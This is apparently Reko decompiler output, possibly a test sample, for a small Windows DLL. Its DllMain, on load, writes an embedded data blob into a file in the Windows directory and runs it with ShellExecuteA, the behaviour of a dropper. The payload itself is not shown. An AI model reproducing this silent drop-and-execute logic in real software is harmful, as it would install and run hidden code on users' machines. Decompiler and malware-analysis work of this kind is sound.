// subject_reko_0000000000003000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_4 g_t10003000 = 0x518C; // 10003000
void g_v10003004 = ??void??; // 10003004
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t10001000 = 'o'; // 10001000
CHAR g_t10001005 = '\\'; // 10001005
word32 g_dw10001050 = 4252; // 10001050
word32 g_dw10001054 = 0x10AA; // 10001054
word32 g_dw10001058 = 0x10B8; // 10001058
word32 g_dw1000105C = 0x10D0; // 1000105C
word32 g_dw10001060 = 0x10DC; // 10001060
word32 g_dw10001068 = 4342; // 10001068
<anonymous> * __imp__CloseHandle = &g_t109C; // 10001070
<anonymous> * __imp__CreateFileA = &g_t10AA; // 10001074
<anonymous> * __imp__GetWindowsDirectoryA = &g_t10B8; // 10001078
<anonymous> * __imp__WriteFile = &g_t10D0; // 1000107C
<anonymous> * __imp__lstrcatA = &g_t10DC; // 10001080
<anonymous> * __imp__ShellExecuteA = &g_t10F6; // 10001088
// 10001120: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
Eq_2 DllMain(Eq_3 hModule, Eq_4 dwReason, Eq_5 lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&g_t10001200, 0x0400);
		lstrcatA(&g_t10001200, &g_t10001005);
		if (fn1000117A(&g_t10001200) != 0x00)
			ShellExecuteA(null, &g_t10001000, &g_t10001200, null, null, 0x00);
	}
	return 0x01;
}

// 1000117A: Register word32 fn1000117A(Stack Eq_19 dwArg04)
// Called from:
//      DllMain
word32 fn1000117A(Eq_19 dwArg04)
{
	Eq_4 tLoc08;
	word32 ebx_15 = 0x00;
	Eq_3 eax_32 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_32 != (void *) ~0x00)
	{
		WriteFile(eax_32, &g_v10003004, g_t10003000, &tLoc08, null);
		CloseHandle(eax_32);
		ebx_15 = 0x01;
	}
	return ebx_15;
}

CHAR g_t10001200 = '\0'; // 10001200
